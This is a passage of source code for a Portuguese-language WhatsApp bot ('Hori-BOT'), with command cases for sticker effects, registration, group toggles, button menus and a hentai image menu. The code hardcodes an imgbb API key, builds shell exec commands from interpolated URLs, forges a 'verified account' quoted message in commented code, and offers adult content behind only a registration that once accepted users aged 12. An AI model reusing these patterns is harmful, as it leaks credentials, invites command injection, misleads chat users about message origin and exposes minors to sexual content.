                            loli.sendMessage(from, nobg, sticker, {quoted: say1})
                            fs.unlinkSync(rano)
                        })
                        })
                    } else {
                    reply('Você precisa marcar ou enviar uma imagem para isso')
                    }
                    break

case 'figushit':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        reply(mess.wait)                     
                        owgi = await loli.downloadAndSaveMediaMessage(ger)
                        anu = await imgbb("941644256336912a1409c0bcfce50071", owgi)
                        imgtrg = `${anu.display_url}`
                        ranp = getRandom('.gif')
                        rano = getRandom('.webp')
                        anu1 = `https://api-exteam.herokuapp.com/api/shit?img=${imgtrg}`
                        exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
                            fs.unlinkSync(ranp)
                            if (err) return reply(`DEU ERROR 😞`)
                            nobg = fs.readFileSync(rano)
                            loli.sendMessage(from, nobg, sticker, {quoted: say1})
                            fs.unlinkSync(rano)
                        })
                        })
                    } else {
                        reply('Você precisa marcar ou enviar uma imagem para isso')
                    }
                    break

                case 'circulo':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        reply(mess.wait)                     
                        owgi = await loli.downloadAndSaveMediaMessage(ger)
                        anu = await imgbb("941644256336912a1409c0bcfce50071", owgi)
                        imgtrg = `${anu.display_url}`
                        ranp = getRandom('.gif')
                        rano = getRandom('.webp')
                        anu1 = `https://api-exteam.herokuapp.com/api/circle?img=${imgtrg}`
                        exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
                            fs.unlinkSync(ranp)
                            if (err) return reply(`DEU ERROR 😞`)
                            nobg = fs.readFileSync(rano)
                            loli.sendMessage(from, nobg, sticker, {
                                quoted: say1
                            })
                            fs.unlinkSync(rano)
                        })
                        })
                    } else {
                        reply('Você precisa marcar ou enviar uma imagem para isso')
                    }
                    break




/*case 'rg':            				
if (isUser) return  reply(`📌 *Você já está registrado*`)
if (!q.includes('/')) return reply(ptbr.rgerrado(prefix, pushname))
const namaUser = q.substring(0, q.indexOf('/') - 0)
const umurUser = q.substring(q.lastIndexOf('/') + 1)
const serialUser = createSerial(20)
if(isNaN(umurUser)) return await reply('A idade precisa ser um número!!')
if (namaUser.length >= 30) return reply(`seu nome e muito grande!!!`)
if (umurUser > 40) return reply(`Precisa ter no maximo 40 anos`)
if (umurUser < 12) return reply(`Precisa ter no mínimo 12 anos`)
  try {
 var ppimg = await loli.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
   var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
buff = await getBuffer(ppimg)
const tekentod = 
`
┬────────────┈ ⳹
┌┤➤ REGISTRADO
││
││Registro bem-sucedido com
││ID: ${serialUser}
││horário ${time}
││Nome: ${namaUser}
││Idade: ${umurUser}
││Número: wa.me/${sender.split('@')[0]}
││Obrigada por se registrar
││Para usar o bot digite ${prefix}menu
││Total de usuários registrados: ${_registered.length}
│├────────
││ _SISTEMA DE REGISTRO_
│└────────
│Copyright © zadik/Hori-BOT 2022
╰─━━━─── • ───━━━❋ཻུ۪۪⸙
`            
veri = sender
if (isGroup) {
addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
await loli.sendMessage(from, buff, image, {sendEphemeral: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: mek, caption: `${tekentod}`})
addATM(sender)
addLevelingId(sender)                 
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m REGISTER \x1b[1;37m]', color(time, 'yellow'), 'Nome:', color(namaUser, 'yellow'), 'idade:', color(umurUser, 'yellow'), 'Serial:', color(serialUser, 'yellow'), 'Numero:', color(sender || groupName))
} else {
addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
await loli.sendMessage(from, buff, image, {sendEphemeral: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: mek, caption: `${tekentod}`})
addATM(sender)
addLevelingId(sender)                  
// console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Age:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'))                   }              
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m REGISTER \x1b[1;37m]', color(time, 'yellow'), 'Nome:', color(namaUser, 'yellow'), 'idade:', color(umurUser, 'yellow'), 'Serial:', color(serialUser, 'yellow'))
}
break*/

case 'rg':            				
if (isUser) return  reply(`📌 *Você já está registrado*`)
const namaUser = q.substring(0, q.indexOf('/') - 0)
const serialUser = createSerial(20)
  try {
 var ppimg = await loli.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
   var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
buff = await getBuffer(ppimg)
const tekentod = 
`
┬────────────┈ ⳹
┌┤➤ REGISTRADO
││
││Registro bem-sucedido com
││ID: ${serialUser}
││horário ${time}
││Nome: ${pushname}
││Número: wa.me/${sender.split('@')[0]}
││Obrigada por se registrar
││Para usar o bot digite ${prefix}menu
││Total de usuários registrados: ${_registered.length}
│├────────
││ _SISTEMA DE REGISTRO_
│└────────
│Copyright © zadik/Hori-BOT 2022
╰─━━━─── • ───━━━❋ཻུ۪۪⸙
`            
veri = sender
if (isGroup) {
addRegisteredUser(sender, pushname, time, serialUser)
await loli.sendMessage(from, buff, image, {sendEphemeral: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: mek, thumbnail:null, caption: `${tekentod}`})
addATM(sender)
addLevelingId(sender)                 
} else {
addRegisteredUser(sender, pushname, time, serialUser)
await loli.sendMessage(from, buff, image, {sendEphemeral: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: mek, thumbnail:null, caption: `${tekentod}`})
addATM(sender)
addLevelingId(sender)                  
}
break

case 'q':
reply(`Registrados ${_registered.length}`)
break

case 'registrados':
tobi = `${_registered.length}`
bo = args[0]
_registered.sort((a, b) => (a.name < b.name) ? 1 : -1)			
let registrados = `*REGISTRADOS*:\nTotal : ${sayo}\n\n`
let nom2 = 0
try {
for (let i = 0; i < `${sayo}`; i++) {
nom2++
registrados += `*${nom2}º*?? : ${_registered[i].name}\n\n`                        
}
await reply(registrados)                   
} catch (err) {
console.error(err)
await reply(`Precisa ter mais Usuários registrados`)
}
break

/*case 'teste':
texto = isAntiflod ? 'Ativado' : 'desativado'
reply(`${texto}`)
break*/

/*╭◪ 「🎉 ｂａｔｅｒｉａ 🎉」
╰───────────────╮  
╭───────────────╯
├❏🔋 : ${baterai}
├➥ Bateria do bot 
├❏ 📊 : ${porcentagem}
├➥ Porcentagem do bot
╰───────────────╯`*/

/*case 'menu':
wew = fs.readFileSync('./assets/foto.png')
loli.sendMessage(from, wew, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "𝐂𝐨𝐧𝐭𝐚 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐚", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./assets/botlogo.webp')} } }, caption: help(pushname,p) })
break*/

/*case 'menu':
sayo = fs.readFileSync('./assets/menu.mp4') //LOCAL DO /VÍDEO
loli.sendMessage(from, sayo, MessageType.video, {mimetype: 'video/gif', quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "𝐂𝐨𝐧𝐭𝐚 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐚", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./assets/botlogo.webp')} } }, caption: help(pushname,p) })
break*/

/*case 'help':
				case 'menu':
					loli.sendMessage(from, help(prefix), text)
					break*/

case 'inf':
texto = isAntiflod ? 'Ativado' : 'Desativado'
texto0 = isAntiteste ? 'Ativado' : 'Desativado'
texto1 = isAntiLink ? 'Ativado' : 'Desativado'
texto2 = isAntictt ? 'Ativado' : 'Desativado'
texto3 = isAutofigu ? 'Ativado' : 'Desativado'
texto4 = isLevelingOn ? 'Ativado' : 'Desativado'
texto5 = isWelcome ? 'Ativado' : 'Desativado'
texto6 = banChats ? 'Ta: Privado' : 'Ta Em: Publico'
uptime = process.uptime()
var groups = loli.chats.array.filter(v => v.jid.endsWith('g.us'))
var privat = loli.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
resources = `
┌─❖
│*「 ⚙️-❪STTS/GP❫-⚙️ 」*
└┬❖
   │${groupName}
┌┤⪧ Membros: ${groupMembers.length}
│✑ Admins* : ${groupAdmins.length}
│└────────────┈ ⳹
┼────────────┈ ⳹
┌┤「 🏓 ON/OFF 🏓 」
││
││⪧ Anti Flod: ${texto}
││⪧ Anti Fake: ${texto0}
││⪧ Anti Link: ${texto1}
││⪧ Anti Cont: ${texto2}
││⪧ Auto Figu: ${texto3}
││⪧ Level Up:  ${texto4} 
││⪧ Welcome: ${texto5}
││⪧ Bot ${texto6}
│├────────
││ _Ativado/Desativado_
│└────────
╰─━━━━─── • ───━━━━ ⳹
┌─❖
│*「 ⚙️-❪INFO/BOT❫-⚙️ 」*
└┬❖
┌┤⪧ Tempo Ativado:
││${runtime(process.uptime())}
││⪧ Bateria: ${bateria}%
││⪧ Total De Grupos: ${groups.length}
││⪧ Pessoas No Privado: ${privat.length}
││⪧ Registrados ${_registered.length}
│├────────
││ _info do bot_
│└────────
│Copyright © zadik/Hori-BOT 2022
╰─━━━─── • ───━━━❋ཻུ۪۪⸙`
loli.sendMessage(from, resources, text, {quoted: mek})
break

case 'antiflod':
case 'antiflods':
//addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return  reply(ptbr.ownerB())
if (args.length < 1) return reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
if (args[0] === 'ativar') {
if (isAntiflod) return reply('*[❗] ja esta ativado nii-san*')
antiflod.push(from)
fs.writeFileSync('./arquivos/antiflod.json', JSON.stringify(antiflod))
reply(`[❗] Comando ${command} ativado, Aparti de agora não pode flodar comandos`)
} else if (args[0] === 'desativar') {
let position = antiflod.indexOf(antiflod.find((x) => x === from))
if (position === -1) return reply('Antiflod não estava ativo antes')
antiflod.splice(position, 1)
fs.writeFileSync('./arquivos/antiflod.json', JSON.stringify(antiflod))
reply(`[❗] Comando ${command} desativado, Aparti de agora pode flodar comandos`)
} else {
reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
}
break

case 'antilink':
case 'antilinks':
//addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (args.length < 1) return reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
if (args[0] === 'ativar') {
if (isAntiLink) return reply('*[❗] ja esta ativado nii-san*')
antilink.push(from)
fs.writeFileSync('./arquivos/antilink.json', JSON.stringify(antilink))
reply(mess.only.tobireplay)
} else if (args[0] === 'desativar') {
let position = antilink.indexOf(antilink.find((x) => x === from))
if (position === -1) return reply(`${command} não estava ativo antes`)
antilink.splice(position, 1)
fs.writeFileSync('./arquivos/antilink.json', JSON.stringify(antilink))
reply(mess.only.tobireplayoff)
} else {
reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
}
break

case 'antictt': case 'anticott':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (args.length < 1) return reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
if (args[0] === 'ativar') {
if (isAntictt) return reply('*[❗] ja esta ativado nii-san*')
antictt.push(from)
fs.writeFileSync('./arquivos/antictt.json', JSON.stringify(antictt))
reply(mess.only.tobireplay)
reply('Agora quem manda qualquer contato vai ser removido do grupo')
} else if (args[0] === 'desativar') {
antictt.splice(from, 1)
fs.writeFileSync('./arquivos/antictt.json', JSON.stringify(antictt))
reply(mess.only.tobireplayoff)
} else {
reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
}
break 

case 'autofigu':
//addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (args.length < 1) return reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
if (args[0] === 'ativar') {
if (isAutofigu) return reply('*[❗] ja esta ativado nii-san*')
autofigu.push(from)
fs.writeFileSync('./arquivos/autofigu.json', JSON.stringify(autofigu))
reply(mess.only.tobireplay)
} else if (args[0] === 'desativar') {
let position = autofigu.indexOf(autofigu.find((x) => x === from))
if (position === -1) return reply(`${command} não estava ativo antes`)
autofigu.splice(position, 1)
fs.writeFileSync('./arquivos/autofigu.json', JSON.stringify(autofigu))
reply(mess.only.tobireplayoff)
} else {
reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
}
break

case 'leveling':
case 'leveis':
//addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (args.length < 1) return reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
if (args[0] === 'ativar') {
if (isLevelingOn) return reply('*[❗] ja esta ativado nii-san*')
_leveling.push(from)
fs.writeFileSync('./arquivos/leveling.json', JSON.stringify(_leveling))
reply(mess.only.tobireplay)
} else if (args[0] === 'desativar') {
let position = _leveling.indexOf(_leveling.find((x) => x === from))
if (position === -1) return reply(`${command} não estava ativo antes`)
_leveling.splice(position, 1)
fs.writeFileSync('./arquivos/leveling.json', JSON.stringify(_leveling))
reply(mess.only.tobireplayoff)
} else {
reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
}
break

case 'antifake':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (args.length < 1) return reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
if (args[0] === 'ativar') {
if (isAntiteste) return reply('*[❗] ja esta ativado nii-san*')
antiteste.push(from)
fs.writeFileSync('./arquivos/antiteste.json', JSON.stringify(antiteste))
reply(mess.only.tobireplay)
} else if (args[0] === 'desativar') {
antiteste.splice(from, 1)
fs.writeFileSync('./arquivos/antiteste.json', JSON.stringify(antiteste))
reply(mess.only.tobireplayoff)
} else {
reply(`[❗]ativar/desativar, Exemplo ${prefix}${command} ativar`)
}
break 

case 'teste': 
case 'Resources':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
texto = isAntiflod ? 'Ativado' : 'Desativado'
texto0 = isAntiteste ? 'Ativado' : 'Desativado'
texto1 = isAntiLink ? 'Ativado' : 'Desativado'
texto2 = isAntictt ? 'Ativado' : 'Desativado'
texto3 = isAutofigu ? 'Ativado' : 'Desativado'
texto4 = isLevelingOn ? 'Ativado' : 'Desativado'
texto5 = isWelcome ? 'Ativado' : 'Desativado'
on_off = `
┌─❖
│*「 ⚙️-❪STTS/GP❫-⚙️ 」*
└┬❖
   │${groupName}
┌┤⪧ Membros: ${groupMembers.length}
│✑ Admins* : ${groupAdmins.length}
│└────────────┈ ⳹
┼────────────┈ ⳹
┌┤「 🏓 ON/OFF 🏓 」
││
││⪧ Anti Flod: ${texto}
││⪧ Anti Fake: ${texto0}
││⪧ Anti Link: ${texto1}
││⪧ Anti Cott: ${texto2}
││⪧ Auto Figu: ${texto3}
││⪧ Level Up:  ${texto4} 
││⪧ Welcome: ${texto5}
│├────────
││ _Ativado/Desativado_
│└────────
╰─━━━━─── • ───━━━━ ⳹`
loli.sendMessage(from, on_off, text, {quoted: mek})
break


/*case 'menu':       
						
						let contentt = fs.readFileSync(`./database/help/menu.jpg`)
const media = await loli.prepareMessage(from, contentt, MessageType.image, { thumbnail:fs.readFileSync(`./database/help/bot.jpg`)})
let qweriio = media.message["ephemeralMessage"] ? media.message.ephemeralMessage : media
const buttons1 = [
  {buttonId: 'Rg', buttonText: {displayText: 'Ξ Registrar'}, type: 1},
  {buttonId: 'Menu', buttonText: {displayText: 'Ξ Menu'}, type: 1},
  {buttonId: 'Info grupo', buttonText: {displayText: 'Ξ Grupo info'}, type: 1},
  ]

const btn1 = {
        contentText: `Caso não apareça os botões\nUse o comando ${prefix}help`,
    footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
    buttons: buttons1,
    headerType: 4,
    imageMessage: qweriio.message.imageMessage
}

loli.sendMessage(from,  btn1, MessageType.buttonsMessage, {quoted: mek})
						
        break*/

case 'menu':
const buttons = [
  {buttonId: 'Rg', buttonText: {displayText: '◎ Registrar ✅'}, type: 1},
  {buttonId: 'Menu', buttonText: {displayText: '◎ Menu 📄 '}, type: 1},
  {buttonId: `${prefix}zadik` , buttonText: {displayText: '◎ 🛐Criador🛐'}, type: 1},
  {buttonId: 'Info grupo', buttonText: {displayText: '◎ Grupo info'}, type: 1},
  {buttonId: 'Regras', buttonText: {displayText: '◎ Regras'}, type: 1},
  {buttonId: 'hentaimenu', buttonText: {displayText: '◎ Hentaimenu🔞'}, type: 1},
  {buttonId: 'patentes', buttonText: {displayText: '◎ Patentes🤴'}, type: 1},
  ]
  wew = fs.readFileSync('./src/logo.jpeg')
  mhan = await loli.prepareMessage(from, wew, image, {thumbnail: null})
const buttonMessage = {
	imageMessage: mhan.message.imageMessage,
    contentText: `Caso não apareça os botões\nUse o comando ${prefix}help\nGrupos: bit.ly/HoriBOTGrupos`,
    footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
    buttons: buttons,
    headerType: 4
}
loli.sendMessage(from, buttonMessage, MessageType.buttonsMessage,
{"contextInfo": {
            "forwardingScore": 3,
            isForwarded: true,
            mentionedJid: [sender],
            externalAdReply: {
            "title": `_© 𝙃𝙊𝙍𝙄_`,
            "body": `🎉🎊🎉Clique Aqui🎉🎊🎉`,
            "mediaType": "VIDEO",
            "mediaType": 2,
            "thumbnailUrl": `https://i.imgur.com/rra3IaP.png`,
            "mediaUrl": `https://youtu.be/XTd--DZA2yY`
        }}, quoted: say4})
break

case 'itsme':
//   if (!isRegister) return reply(mess.only.daftarB)
  try {
ppimg = await loli.getProfilePicture(`${sender.split('@')[0]}@c.us`)
  } catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
  }
  teks = `‣ *Nome* : ${pushname}
  ‣ *Número* : ${sender.split("@")[0]}
  ‣ *Link* : wa.me/${sender.split("@")[0]}`
  its = await getBuffer (ppimg)
  loli.sendMessage(from, its, image, {
quoted: mek, caption: teks
  })
 
  break

case 'itsme':
//   if (!isRegister) return reply(mess.only.daftarB)
  try {
ppimg = await loli.getProfilePicture(`${sender.split('@')[0]}@c.us`)
  } catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
  }
  teks = `‣ *Nome* : ${pushname}
  ‣ *Número* : ${sender.split("@")[0]}
  ‣ *Link* : wa.me/${sender.split("@")[0]}`
  its = await getBuffer (ppimg)
  loli.sendMessage(from, its, image, {
quoted: mek, caption: teks
  })
 
  break

default:

if (selectedButton == `Menu`) {
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
menus = ["1", "2", "3"]
res = menus[Math.floor(Math.random() * menus.length)]
const useLevel = getLevelingLevel(sender)
const useXp = getLevelingXp(sender)
const useTime = getRegisterTime(sender) 
const requireXp = 20 * Math.pow(useLevel, 2) + 150 * useLevel + 1000
if (useLevel === undefined && chec === undefined) addLevelingId(sender)
const checATM = checkATMuser(sender)
const chatss = `${totalchat.length}`
const comandost = totalcmd
result = fs.readFileSync(`./database/audios/menu` + res + `.mp3`)
loli.sendMessage(from, result, audio, {mimetype: 'audio/mp4', quoted: mek, ptt: true})
wew = fs.readFileSync('./database/help/menu.png')
loli.sendMessage(from, wew, image , {sendEphemeral: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: mek, thumbnail: fs.readFileSync('./database/help/bot.jpg'), caption: help(bateria, pushname, prefix, hr, chatss, ucapanFakereply, prema, checATM, useLevel, requireXp, useXp, patt) })
if(useLevel == undefined && useXp == undefined){
}
}


if (selectedButton == `Rg`) {
if (isUser) return  reply(`📌 *Você já está registrado*`)
const serialUser = createSerial(20)
  try {
 var ppimg = await loli.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
   var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
buff = await getBuffer(ppimg)
reply(`[📌] Obrigado por se registrar, Todos os dados foram enviados no privado`)
const tekentod = `
┬────────────┈ ⳹
┌┤➤ REGISTRADO
││
││Registro bem-sucedido com
││ID: ${serialUser}
││horário ${time}
││Nome: ${pushname}
││Número: wa.me/${sender.split('@')[0]}
││Obrigada por se registrar
││Para usar o bot digite ${prefix}menu
││Total de usuários registrados: ${_registered.length}
│├────────
││ _SISTEMA DE REGISTRO_
│└────────
│Copyright © zadik/Hori-BOT 2022
╰─━━━─── • ───━━━❋ཻུ۪۪⸙
`
veri = sender
if (isGroup) {
addRegisteredUser(sender, pushname, time, serialUser)
await loli.sendMessage(sender, buff, image, {sendEphemeral: true, contextInfo: {mentionedJid: [sender], forwardingScore: 508, isForwarded: true}, quoted: mek, caption: `${tekentod}`})
addATM(sender)
addLevelingId(sender)                 
} else {
addRegisteredUser(sender, pushname, time, serialUser)
await loli.sendMessage(sender, buff, image, {sendEphemeral: true, contextInfo: {mentionedJid: [sender], forwardingScore: 508, isForwarded: true}, quoted: mek, caption: `${tekentod}`})
addATM(sender)
addLevelingId(sender)                  
}
}
if (selectedButton == `patentes`) {
loli.updatePresence(from, Presence.composing)
 if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const patentegif2 = fs.readFileSync('./src/patentegif.mp4')
loli.sendMessage(from, patentegif2,  MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: `
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ ᴍᴇɴᴜ ᴅᴇ ᴘᴀᴛᴇɴᴛᴇs
┃⋆│
┃⋆│💎➢ Bronze I🥉 
┃⋆│
┃⋆│💎➢  Bronze II🥉 
┃⋆│
┃⋆│💎➢  Bronze  III🥉 
┃⋆│
┃⋆│💎➢  Bronze  IV🥉 
┃⋆│
┃⋆│💎➢  Bronze  V🥉
┃⋆│
┃⋆│💎➢  Prata I🥈
┃⋆│
┃⋆│💎➢  Prata II🥈
┃⋆│
┃⋆│💎➢  Prata III🥈
┃⋆│
┃⋆│💎➢  Prata IV🥈
┃⋆│
┃⋆│💎➢  Prata V🥈
┃⋆│
┃⋆│💎➢  Ouro I🥇
┃⋆│
┃⋆│💎➢  Ouro II🥇
┃⋆│
┃⋆│💎➢  Ouro III??
┃⋆│
┃⋆│💎➢  Ouro IV🥇
┃⋆│
┃⋆│💎➢  Ouro V🥇 
┃⋆│
┃⋆│💎➢  Campeão I🏆 
┃⋆│
┃⋆│💎➢  Campeão II🏆 
┃⋆│
┃⋆│💎➢  Campeão III🏆 
┃⋆│
┃⋆│💎➢  Campeão IV🏆
┃⋆│
┃⋆│💎➢  Campeão V🏆 
┃⋆│
┃⋆│💎➢  Diamante I 💎 
┃⋆│
┃⋆│💎➢  Diamante II 💎 
┃⋆│
┃⋆│💎➢  Diamante III 💎 
┃⋆│
┃⋆│💎➢  Diamante IV 💎 
┃⋆│
┃⋆│💎➢  Diamante V 💎 
┃⋆│
┃⋆│💎➢  Mestre I 🐂 
┃⋆│
┃⋆│💎➢  Mestre II 🐂 
┃⋆│
┃⋆│💎➢  Mestre III 🐂 
┃⋆│
┃⋆│💎➢  Mestre IV 🐂 
┃⋆│
┃⋆│💎➢  Mestre V 🐂 
┃⋆│
┃⋆│💎➢  Mítico I 🔮 
┃⋆│
┃⋆│💎➢  Mítico II 🔮 
┃⋆│
┃⋆│⭐➢  Mítico III 🔮 
┃⋆│
┃⋆│💎➢  Mítico IV 🔮 
┃⋆│
┃⋆│💎➢ Mítico V 🔮 
┃⋆│
┃⋆│💎➢  God I🕴 
┃⋆│
┃⋆│💎➢  God II🕴 
┃⋆│
┃⋆│💎➢  God III🕴
┃⋆│
┃⋆│💎➢  God IV🕴
┃⋆│
┃⋆│💎➢  God V🕴
┃⋆│
┃⋆│💎➢  Grande Mestre I 🛐  
┃⋆│
┃⋆│💎➢  Grande Mestre II 🛐 
┃⋆│
┃⋆│💎➢  Grande Mestre III 🛐 
┃⋆│
┃⋆│💎➢  Grande Mestre IV 🛐 
┃⋆│
┃⋆│💎➢  Elite🛡 
┃⋆│
┃⋆│💎➢  Global🌏 
┃⋆│
┃⋆│💎➢  Herói⚔ 
┃⋆│
┃⋆│💎➢  Lendário🏯 
┃⋆│
┃⋆│💎➢  Semi-Deus👼 
┃⋆│
┃⋆│💎➢  Arcanjo😇 
┃⋆│
┃⋆│💎➢  Demoníaco👹 
┃⋆│
┃⋆│💎➢  Deus-Sama🧙‍♂️
┃⋆│
┃⋆│💎➢  Divindade 🤴 
┃⋆│
┃⋆│💎➢  Divindade Suprema  👤👁
┃⋆╰───────────────────
╰━════════════════════⊷ 
⭐👸ραтєηтєѕ ∂σ нєηρℓαу👸⭐`})

}

if (selectedButton == `hentaimenu`) {
loli.updatePresence(from, Presence.composing)
    if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                  const hentaigif1 = fs.readFileSync('./src/hentaigif.mp4') 
                    loli.sendMessage(from, hentaigif1, MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: `
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ ᴍᴇɴᴜ ᴅᴇ ʜᴇɴᴛᴀɪ🔞
┃⋆│
┃⋆│💎➢ ${prefix}trap ⟨🔞⟩
┃⋆│➥ imagem de trap hentai
┃⋆│💎➢ ${prefix}waifu2 ⟨🔞⟩
┃⋆│➥ manda imagem random hentai 2k a 4k
┃⋆│💎➢ ${prefix}pernas ⟨🔞⟩
┃⋆│➥ manda imagem random de pernas hentai
┃⋆│💎➢ ${prefix}oppai ⟨🔞⟩
┃⋆│➥ manda imagem de hentai com peitos
┃⋆│💎➢ ${prefix}ero ⟨🔞⟩
┃⋆│➥ imagem sexualizando hentai
┃⋆│💎➢ ${prefix}anal ⟨🔞⟩
┃⋆│➥ hentai com anal hentai
┃⋆│💎➢ ${prefix}ahegao ⟨🔞⟩
┃⋆│➥ hentai com ahegao hentai
┃⋆│💎➢ ${prefix}futa ⟨🔞⟩ hentai
┃⋆│➥ imagem com futanari hentai
┃⋆│💎➢ ${prefix}bigoppai ⟨🔞⟩
┃⋆│➥ imagem hentai com peitos enormes
┃⋆│💎➢ ${prefix}yaoi  ⟨🔞⟩
┃⋆│➥ hentai gay ou BL
